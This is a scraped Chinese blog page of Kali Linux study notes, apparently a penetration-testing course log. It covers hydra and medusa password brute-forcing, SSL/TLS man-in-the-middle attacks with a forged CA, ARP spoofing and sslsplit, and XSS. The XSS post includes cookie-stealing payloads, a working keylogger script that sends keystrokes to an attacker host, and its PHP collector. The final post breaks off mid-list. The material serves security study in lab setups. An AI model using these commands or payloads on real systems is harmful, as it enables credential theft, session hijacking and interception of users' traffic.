                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-hydra（稳定性可能较差）"><a href="#1-hydra（稳定性可能较差）" class="headerlink" title="1. hydra（稳定性可能较差）"></a>1. hydra（稳定性可能较差）</h4><ul>
<li>在线密码破解–对在线服务的密码破解</li>
<li>离线密码破解–非在线服务的密码破解</li>
<li>Hydra<ul>
<li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li>
<li>-vV（查看详细信息）</li>
<li>-t（并发连接数）</li>
<li>-e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’）</li>
<li>-s（非默认输入端口）</li>
<li>-L（自定义密码文件）</li>
<li>-P（系统密码文件）</li>
</ul>
</li>
<li>Windows密码破解<ul>
<li>window2003设置密码，开启远程桌面（net share查看共享文件）</li>
<li><strong><code>🔺命令：hydra -l administartor -P pass.lst smb://1.1.1.1 -vV</code></strong></li>
<li><strong><code>🔺命令：hydra -l administartor -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></strong></li>
</ul>
</li>
<li>Linux密码破解<ul>
<li>设置Metasploitable的root登陆密码（sudo passwd root）</li>
<li><strong><code>🔺命令：hydra -l root -P pass.lst ssh://1.1.1.1 -vV</code></strong></li>
<li>▲ 日志服务器的报警</li>
</ul>
</li>
<li>其他服务密码破解<ul>
<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址</code></strong>（是否开启）</li>
<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址 -sV</code></strong>（开启的服务）</li>
<li><strong><code>🔺命令：hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></strong></li>
</ul>
</li>
<li>图形化界面<ul>
<li><strong><code>🔺命令：xhydra</code></strong>（旧版本为hydra-gtk）</li>
<li><strong><code>🔺命令：ftp 1.1.1.1</code></strong>（Metasploitable的21端口ftp服务配置错误，只要用户名正确，无密码）</li>
</ul>
</li>
<li>HTTP表单身份认证<ul>
<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</code></strong> </li>
<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed&quot; -V</code></strong></li>
<li>特征字符非Login Failed，为index.php，特征字符可以位于header中，也可以位于body</li>
<li>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:Foo<ul>
<li>C：先访问指定页面取得cookie </li>
<li>H：指定http头</li>
</ul>
</li>
<li>https-post-form、https-get-form、https-get-form</li>
<li>-S:使用SSL连接</li>
</ul>
</li>
</ul>
<h4 id="2-pw-inspector"><a href="#2-pw-inspector" class="headerlink" title="2. pw-inspector"></a>2. pw-inspector</h4><ul>
<li>pw-inspector<ul>
<li>按长度和字符集筛选字典</li>
<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</code></strong>（小写字母筛选）</li>
<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></strong>（大写字母筛选）</li>
<li>-m（最小位数）</li>
<li>-M（最大位数）</li>
</ul>
</li>
<li>密码破解效率<ul>
<li>密码复杂度（字典命中率）</li>
<li>带宽、协议、服务器性能、客户端性能</li>
<li>锁定阈值</li>
<li>单位时间最大登陆请求次数</li>
</ul>
</li>
</ul>
<h4 id="3-medusa"><a href="#3-medusa" class="headerlink" title="3. medusa"></a>3. medusa</h4><ul>
<li>Hydra的缺点<ul>
<li>稳定性差，程序时常崩溃</li>
<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
<li>每主机新建过程，每服务新建实例</li>
<li>大量目标破解时性能差</li>
<li>▲ 对CPU以及存储空间占用较大</li>
</ul>
</li>
<li>Medusa的特点<ul>
<li>稳定性好（单主机、多主机）</li>
<li>速度控制得当</li>
<li>基于线程</li>
<li>支持模块少于hydra（不支持RDP）</li>
<li>WEB-Form支持存在缺陷（只支持失败获得的信息，且只支持200响应代码的页面）</li>
</ul>
</li>
<li>常用参数<ul>
<li><strong><code>🔺命令：mdeusa -d</code></strong>（查看支持的模块）</li>
<li><strong><code>🔺命令：medusa -M</code></strong>（选择的模块）</li>
<li><strong><code>🔺命令：medusa -M 模块 -q</code></strong>（查看模块详细参数）</li>
<li>-m（大模块相应的参数）    </li>
<li>-h IP地址（选择的主机）-u 用户（指定用户）、-P 密码（指定密码文件）</li>
<li>-e（n/s/ns）（同hydra，但缺少参数r）</li>
<li>-F（获取一个即停止）</li>
<li>-T 数字（并发主机数）</li>
<li>-v 数字（显示破解过程的详细信息程度）</li>
<li>-n 端口（使用端口）</li>
<li>-s （使用SSL连接）</li>
</ul>
</li>
<li>破解Windows密码<ul>
<li><strong><code>🔺命令：net user administrator zipper</code></strong></li>
<li><strong><code>🔺命令：medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></strong></li>
</ul>
</li>
<li>破解Linux SSH密码（Metasploit）<ul>
<li><strong><code>🔺命令：cat /usr/share/wordlists/nmap.lst | grep -v \# &gt; pass.lst</code></strong></li>
<li><strong><code>🔺命令：medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></strong></li>
</ul>
</li>
<li>其他服务密码破解<ul>
<li><strong><code>🔺命令：medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</code></strong></li>
<li><strong><code>🔺命令：medusa -M ftp -h 1.1.1.1 -u ftp -P pass.lst -e ns -F</code></strong></li>
<li><strong><code>🔺命令：medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</code></strong> ▲ 2020.1.25实验无法破解密码</li>
</ul>
</li>
</ul>
<h4 id="4-在线密码破解"><a href="#4-在线密码破解" class="headerlink" title="4. 在线密码破解"></a>4. 在线密码破解</h4><ul>
<li>网站的在线密码破解</li>
<li>MD5：<a href="https://cmd5.com/" target="_blank" rel="noopener">https://cmd5.com/</a></li>
<li>多种Hash值：<a href="https://1024tools.com/hash" target="_blank" rel="noopener">https://1024tools.com/hash</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/" itemprop="url">Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-中间人攻击"><a href="#1-中间人攻击" class="headerlink" title="1. 中间人攻击"></a>1. 中间人攻击</h4><ul>
<li>攻击者位于客户端和服务器通信链路中<ul>
<li>ARP（欺骗局域网内所有主机，误认中间人为网关）</li>
<li>DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务）</li>
<li>修改网关（理论上可行，实际上几乎不存在）</li>
<li>修改DNS（设置DNS解析到中间人的服务上）</li>
<li>修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器）</li>
<li>ICMP、STP、OSPF（ICMP的重定向、STP生成树协议、OSPF路由协议）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐STP:生成树协议
1.多个核心层交换机的多线连接，容易形成环路
2.多个核心层交换机的冗杂备份
▲ 交换机物理上的环路，通过生成树协议控制，实现逻辑上的无环路</code></pre></blockquote>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&file_name=/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG" alt="中间人攻击"></p>
<ul>
<li>加密流量</li>
<li>攻击的前提<ul>
<li>客户端已经信任伪造证书颁发机构</li>
<li>攻击者控制了核发证书颁发机构</li>
<li>客户端程序禁止了显示证书错误告警信息</li>
<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
</ul>
</li>
<li>▲ ARP地址欺骗是实现中间人攻击的因素之一</li>
</ul>
<h4 id="2-SSLsplit"><a href="#2-SSLsplit" class="headerlink" title="2. SSLsplit"></a>2. SSLsplit</h4><ul>
<li>SSLsplit（调用Openssl）<ul>
<li>透明SSL/TLS中间人攻击工具</li>
<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
<li>伪装服务器需要伪造证书</li>
<li>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击</li>
</ul>
</li>
<li>利用openssl生成证书私钥<ul>
<li><strong><code>🔺命令：openssl genrsa -out ca.key 2048</code></strong></li>
</ul>
</li>
<li>利用私钥签名生成证书<ul>
<li><strong><code>🔺命令：openssl req -new -x509 -days（证书时间） 1096 -key ca.key -out ca.crt</code></strong></li>
<li>填写相关信息：Country、Province、Locality Name、Organization、Organizational Name、FQDN Name、Email Address</li>
</ul>
</li>
<li>启用路由（中间人）/proc/sys/net/ipv4/ip_forward<ul>
<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong></li>
</ul>
</li>
<li>iptables端口转发规则<ul>
<li><strong><code>🔺命令：iptables -t nat -F</code></strong>（清空当前所有规则）</li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</code></strong> </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</code></strong> #MSA </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</code></strong> #SMTPS </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</code></strong> #IMAPS </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</code></strong> #POP3S </li>
<li><strong><code>🔺命令：iptables -t nat -L</code></strong>（查看添加的所有规则）</li>
</ul>
</li>
<li>ARP欺骗<ul>
<li>win7 → <strong><code>🔺命令：arp a（查看网关MAC地址）</code></strong></li>
<li>Kali → <strong><code>🔺命令：arpspoof -l eth0 -t 1.1.1.2（目标主机） -r 1.1.1.1（欺骗的网关）</code></strong>▲ 2020.1.23修改-l参数为-i</li>
</ul>
</li>
<li>启动SSLsplit<ul>
<li><strong><code>🔺命令：mkdir -p test/logdir</code></strong></li>
<li><strong><code>🔺命令：sslsplit -D（debug模式）-l（连接信息记录） connect.log -j（&quot;越狱目录&quot;） /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></strong></li>
</ul>
</li>
<li>被害者访问taobao，baidu，mail.163.com</li>
<li>查看日志和浏览器证书（connect.log，443.log，80.log）</li>
<li>安装服务器根证书后再次访问<ul>
<li>拷贝根证书到win7电脑上</li>
<li>双击证书安装 → 受信任的根证书颁发机构</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐taobao的官网，除了https加密之外，还对数据进行加密（比如密码控件）
⭐全站https和非全站https的区别，非全站https是指对登陆的账户和密码使用https登陆
⭐可以通过grep 12334 * 去查看要查看的信息（搜索日志文件）</code></pre></blockquote>
<h4 id="3-Mitmproxy"><a href="#3-Mitmproxy" class="headerlink" title="3. Mitmproxy"></a>3. Mitmproxy</h4><ul>
<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
<li>▲ 自动集成生成一张证书（同SSLsplit的证书不同）</li>
<li>Bug：http(80)/https(443)只能在8080端口侦听</li>
<li>iptables端口转发规则<ul>
<li><strong><code>🔺命令：iptables -t nat -F</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</code></strong></li>
</ul>
</li>
<li>启动mitmproxy<ul>
<li><strong><code>🔺命令：mitmproxy -T --host -w mitmproxy.log</code></strong>（窗口记录流量）</li>
<li>Tab 下一个信息/q 退出/也可以鼠标点击访问 </li>
<li>▲ 2020.1.24 -T参数修改为 –mode transparent，-host参数被取消</li>
</ul>
</li>
</ul>
<h4 id="4-SSLstrip"><a href="#4-SSLstrip" class="headerlink" title="4. SSLstrip"></a>4. SSLstrip</h4><ul>
<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
<li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li>
<li>自动生成sslstrip.log文件</li>
<li><strong><code>🔺命令：sslstrip -l 8080</code></strong> ▲ 2020.1.24若无法转变，则会报建立安全连接失败</li>
</ul>
<h4 id="5-SSL-TLS拒绝服务攻击"><a href="#5-SSL-TLS拒绝服务攻击" class="headerlink" title="5. SSL/TLS拒绝服务攻击"></a>5. SSL/TLS拒绝服务攻击</h4><ul>
<li>thc-ssl-dos<ul>
<li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li>
<li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li>
<li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用ADSL线路打垮30G带宽的服务器</li>
<li>服务器平均可以处理300次/秒SSL握手请求</li>
<li>对SMTPS、POP3等服务同样有效</li>
<li><strong><code>🔺命令：thc-ssl-dos 199.223.209.205 2083 --accept</code></strong> ▲ 2020.1.23 Target has disabled renegotiations.</li>
</ul>
</li>
<li>对策<ul>
<li>禁用SSL-Renegotiation、使用SSL Accelerator</li>
<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/" itemprop="url">Kali Linux笔记(五十二)：XSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.9k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  13 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1. XSS"></a>1. XSS</h4><ul>
<li>攻击WEB客户端</li>
<li>客户端脚本语言<ul>
<li>弹窗告警</li>
<li>Javascript</li>
<li>在浏览器中执行</li>
</ul>
</li>
<li>XSS（cross-site scripting）<ul>
<li>▲ 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</li>
<li>注入客户端脚本代码</li>
<li>盗取cookie</li>
<li>重定向</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐之前的攻击手段脚本是对服务端的攻击
⭐Browser → Web Applicatipn → Server → Database
⭐服务器WEB站点存在漏洞，Hacker通过客户端提交给WEB站点，攻击WEB客户端</code></pre></blockquote>
<ul>
<li>VBScript（针对微软浏览器），ActiveX，or Flash</li>
<li>JavaScript<ul>
<li>与Java语言无关</li>
<li>命名完全出于市场原因</li>
<li>使用最广的客户端脚本语言</li>
</ul>
</li>
<li>使用场景<ul>
<li>直接嵌入html：<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
<li>元素标签事件：<code>&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
<li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></li>
<li>其他标签：<code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li>
<li>DOM对象，篡改页面内容</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐DOM，文本对象模型，每一个页面对应一个DOM对象，每个页面中的元素对应一个DOM对象中的子元素，基于DOM提出了一些API，可以用jS调用DOM的API进行修改元素，不向服务器端发送请求</code></pre></blockquote>
<ul>
<li>攻击参与方<ul>
<li>攻击者</li>
<li>被攻击者</li>
<li>漏洞站点</li>
<li>第三方站点（攻击目标、攻击参与站）</li>
</ul>
</li>
<li>漏洞形成的根源（传入传出无做”消毒”）<ul>
<li>服务器对用户提交数据过滤不严</li>
<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
<li>脚本在客户端执行恶意操作</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐第三方站点存在xss漏洞（比如第三方站点为淘宝）
1.存放一个js代码
2.客户端每次访问第三方站点，都会下载这个js代码
3.js代码指向一个真正攻击站点，若访问的流量过大，会对真正的目标站点形成DDOS攻击</code></pre></blockquote>
<ul>
<li>XSS漏洞类型（▲ 客户端发送js代码给服务器，服务器原封不动返回js代码给浏览器）<ul>
<li>存储型（持久型，一次注入服务器并保存在服务器上）</li>
<li>反射型（非持久，一次注入服务器，服务器立刻返回给发起方，不保存）</li>
<li>DOM型（本质是反射型，利用浏览器DOM特性，直接在本地执行修改）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐反射型漏洞利用
1.Hacker利用社会工程学调查信息，给受害者发送一封邮件，比如地图等
2.受害者点击地图，会发送地图中的js代码给有漏洞的服务器，js代码可以为监视器等
3.服务器端原端不动发送js代码给受害者
4.js代码到达客户端并在浏览器执行</code></pre></blockquote>
<ul>
<li><p>漏洞PoC  ▲▲ 尝试组合</p>
<ul>
<li><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li>
<li><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;type&lt;/a&gt;</code>（onclick/onload/onerror）</li>
<li><code>&lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#39;xss&#39;)&gt;</code></li>
<li><code>&lt;script&gt;window.location=&quot;http://1.1.1.1&quot;&lt;/script&gt;</code></li>
<li><code>&lt;iframe SRC=&quot;http://1.1.1.1/victim&quot; height=&quot;0&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;</code></li>
<li>▲ 发送Cookies信息：<code>&lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output==&quot;+document.cookie;&lt;/script&gt;</code></li>
<li>▲ 篡改页面：<code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>窃取Cookie</p>
<ul>
<li><strong><code>🔺命令：vi 1.html</code></strong>（body中写入url）</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>a.js源码（隐蔽性强）</p>
<ul>
<li>var img = new Image();</li>
<li>img.src=”<a href="http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐js源码
1.kali，/var/www/html，vi a.js
2.var img = new Image();
3.img.src=&quot;http://1.1.1.1:88/cookies.php?cookie==&quot;+document.cookie;（88端口为nc侦听端口）
4.service apache2 start
5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="2-XSS–键盘记录"><a href="#2-XSS–键盘记录" class="headerlink" title="2. XSS–键盘记录"></a>2. XSS–键盘记录</h4><ul>
<li>Kali上开启apache服务，<strong><code>🔺命令：service apache2 start</code></strong></li>
<li>在kali的/var/www/html/中准备Keylogger.js</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt) &#123; </span><br><span class="line">    evt = evt || window.event </span><br><span class="line">    key = String.fromCharCode(evt.charCode) </span><br><span class="line">    if (key) &#123;       </span><br><span class="line">        var http = new XMLHttpRequest(); </span><br><span class="line">        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        http.send(&quot;key=&quot;+param); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在kali的/var/www/html/中准备Keylogger.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $key=$_POST[&apos;key&apos;]; </span><br><span class="line">    $logfile=&quot;keylog.txt&quot;; </span><br><span class="line">    $fp = fopen($logfile, &quot;a&quot;); </span><br><span class="line">    fwrite($fp, $key); </span><br><span class="line">    fclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在kali的/var/www/html/中准备keylog.txt，不需要写入数据</li>
<li><strong><code>🔺命令：chmod 777 keylog.txt</code></strong>（保证执行权限）</li>
<li>浏览器中注入<code>&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;</code></li>
<li>在浏览器上建立一个a.html <ul>
<li><code>&lt;a href=&quot;http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script +src=&#39;http://192.168.20.8/keylogger.js&#39;&gt;&lt;/script&gt;&quot;&gt;xss（诱惑性语言）&lt;/a&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="3-Xsser–基本使用"><a href="#3-Xsser–基本使用" class="headerlink" title="3. Xsser–基本使用"></a>3. Xsser–基本使用</h4><ul>
<li>命令行/图形化工具</li>
<li>绕过服务器端输入筛选<ul>
<li>10进制/16进制编码</li>
<li>unescape()</li>
</ul>
</li>
<li><strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g（Get方法）/-p（Post方法） &quot;xss_r/?name=XSS（Get方法/Post为body数据段）&quot; --cookie=&quot;securit=low;PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -s（测试提交后统计）-v（显示详细信息）--reverse-check（防止hash值误报，提交建立网络连接的js脚本，基于连接是否建立）</code></strong> ▲ 2020.1.20在低安全级别下注入不成功</li>
<li>–heuristi（检查被过滤的字符）</li>
</ul>
<h4 id="4-Xsser–payload编码"><a href="#4-Xsser–payload编码" class="headerlink" title="4. Xsser–payload编码"></a>4. Xsser–payload编码</h4><ul>
<li>对payload编码，绕过服务器端筛选过滤<ul>
<li>–Str      Use method String.FromCharCode()（字符串编码）</li>
<li>–Une      Use Unescape() function ▲ 注释</li>
<li>–Mix      Mix String.FromCharCode() and Unescape()（混合编码）</li>
<li>–Dec      Use Decimal encoding（十进制编码）</li>
<li>–Hex      Use Hexadecimal encoding（十六进制编码）</li>
<li>–Hes      Use Hexadecimal encoding, with semicolons</li>
<li>–Dwo      Encode vectors IP addresses in DWORD（IP地址编码，双字节）</li>
<li>–Doo      Encode vectors IP addresses in Octal（IP地址编码，Octal形式）</li>
<li>–Cem=CEM  Try -manually- different Character Encoding Mutations</li>
<li>(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li>
</ul>
</li>
</ul>
<h4 id="5-Xsser–注入技术"><a href="#5-Xsser–注入技术" class="headerlink" title="5. Xsser–注入技术"></a>5. Xsser–注入技术</h4><ul>
<li>注入技术（多选）<ul>
<li>–Coo      Cross Site Scripting Cookie injection（Cookie注入）</li>
<li>–Xsa      Cross Site Agent Scripting（Agent注入）</li>
<li>–Xsr      Cross Site Referer Scripting（Referer注入）</li>
<li>–Dcp      Data Control Protocol injections（数据控制协议注入）</li>
<li>–Dom      Document Object Model injections（DOM对象注入）</li>
